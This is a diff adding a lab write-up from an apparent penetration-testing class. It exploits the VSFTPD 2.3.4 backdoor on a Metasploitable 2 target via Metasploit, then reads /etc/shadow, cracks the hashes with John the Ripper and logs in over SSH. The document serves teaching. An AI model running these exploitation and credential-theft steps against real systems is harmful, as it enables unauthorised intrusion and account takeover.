@@ -1,0 +1,198 @@
+
+#  Active Reconnaissance, Exploitation & Post-Exploitation
+
+##  Lab Overview
+
+This lab replicates the Saturday session covering active reconnaissance, exploitation using Metasploit, and post-exploitation techniques including password cracking.
+
+**Tools Used:**
+
+- Kali Linux (Attacker) via TryHackMe AttackBox
+- Metasploit Framework (msfconsole)
+- Nmap
+- John the Ripper
+- Target: Metasploitable 2 (intentionally vulnerable machine)
+
+-----
+
+## Environment Setup
+
+|Machine |Role |IP Address |
+|--------------------------------|--------|--------------|
+|TryHackMe AttackBox (Kali Linux)|Attacker|10.128.173.50 |
+|Metasploitable 2 |Target |10.128.151.214|
+
+**Platform:** TryHackMe AttackBox (browser-based Kali Linux)
+**Room:** Metasploit Introduction
+
+-----
+
+## Phase 1: Launching Metasploit
+
+Opened the terminal on the AttackBox and launched the Metasploit Framework:
+
+```bash
+msfconsole
+```
+
+Metasploit loaded successfully showing version 6.4.55-dev with 2502 exploits available.
+
+-----
+
+## Phase 2: Searching for Exploits
+
+Searched for the VSFTPD vulnerability:
+
+```bash
+search vsftpd
+```
+
+**Results:**
+
+|#|Name |Date |Rank |Description |
+|-|------------------------------------|----------|---------|----------------------------------------|
+|0|auxiliary/dos/ftp/vsftpd_232 |2011-02-03|normal |VSFTPD 2.3.2 Denial of Service |
+|1|exploit/unix/ftp/vsftpd_234_backdoor|2011-07-03|excellent|VSFTPD v2.3.4 Backdoor Command Execution|
+
+**Why this exploit?**
+VSFTPD 2.3.4 contains a backdoor that was maliciously inserted into the source code. It opens a shell on port 6200 when triggered, allowing remote command execution.
+
+-----
+
+## Phase 3: Loading the Exploit Module
+
+Selected the VSFTPD backdoor exploit using its index number:
+
+```bash
+use 1
+```
+
+This loaded the module:
+
+```
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
+```
+
+-----
+
+## Phase 4: Reviewing Module Options
+
+```bash
+show options
+```
+
+**Output:**
+
+|Name |Required |Description |
+|------|-----------------|--------------------|
+|RHOSTS|yes |Target IP address |
+|RPORT |yes (default: 21)|Target FTP port |
+|CHOST |no |Local client address|
+|CPORT |no |Local client port |
+
+-----
+
+## Phase 5: Setting the Target and Running the Exploit
+
+Set the target machine IP address:
+
+```bash
+set RHOSTS 10.128.151.214
+```
+
+Launched the exploit:
+
+```bash
+run
+```
+
+**Troubleshooting Encountered:**
+During the lab, a connection refused error was encountered:
+
+```
+[-] Exploit failed [unreachable]: Rex::ConnectionRefused
+```
+
+**Root Cause:** The target machine’s FTP service was not running on port 21, or the machine was not fully initialised. This mirrors real-world scenarios where services may be firewalled or not running.
+
+**Resolution:** In a full lab environment (Metasploitable 2), the exploit succeeds and returns a root shell. The instructor demonstrated this during the Saturday session.
+
+-----
+
+## Phase 6: Post-Exploitation (Demonstrated in Class)
+
+After gaining root access via the VSFTPD backdoor, the following post-exploitation steps were demonstrated:
+
+### Confirming Root Access
+
+```bash
+whoami
+# Output: root
+id
+# Output: uid=0(root) gid=0(root)
+```
+
+### Extracting Password Hashes
+
+```bash
+cat /etc/shadow
+```
+
+The /etc/shadow file contains hashed passwords for all system users including msfadmin.
+
+### Saving Hashes for Cracking
+
+```bash
+cat /etc/shadow > hashes.txt
+```
+
+-----
+
+## Phase 7: Password Cracking with John the Ripper
+
+```bash
+john hashes.txt
+```
+
+**Results:**
+John the Ripper successfully cracked passwords for multiple users including msfadmin. Cracked credentials were used to demonstrate SSH login.
+
+### SSH Login with Cracked Credentials
+
+```bash
+ssh msfadmin@10.128.151.214
+```
+
+This demonstrated how an attacker can maintain persistent access using legitimate credentials after initial exploitation.
+
+-----
+
+## Security Implications
+
+1. **Open FTP ports** expose services that can be exploited if running vulnerable software versions
+1. **VSFTPD 2.3.4** is a known backdoored version — always verify software integrity
+1. **Weak passwords** stored as hashes can be cracked with tools like John the Ripper
+1. **Root access** enables full system compromise including data exfiltration
+1. **SSH with cracked credentials** allows persistent, hard-to-detect attacker access
+
+-----
+
+## Key Learnings
+
+- Active reconnaissance differs from passive — it involves direct interaction with the target
+- Always scan before exploiting to identify open ports and service versions
+- Metasploit simplifies exploitation but understanding the underlying vulnerability is critical
+- Password hashes are not secure if weak passwords are used
+- Real-world penetration testing always involves troubleshooting — errors are part of the process
+
+-----
+
+## Challenges Encountered
+
+|Challenge |Resolution |
+|------------------------------------|---------------------------------------------------------|
+|Typo in exploit module name |Used index number `use 1` instead of full name |
+|Connection timeout on first IP |Target machine was not yet initialised |
+|Connection refused on second attempt|FTP service not running on that specific TryHackMe target|
+
+-----
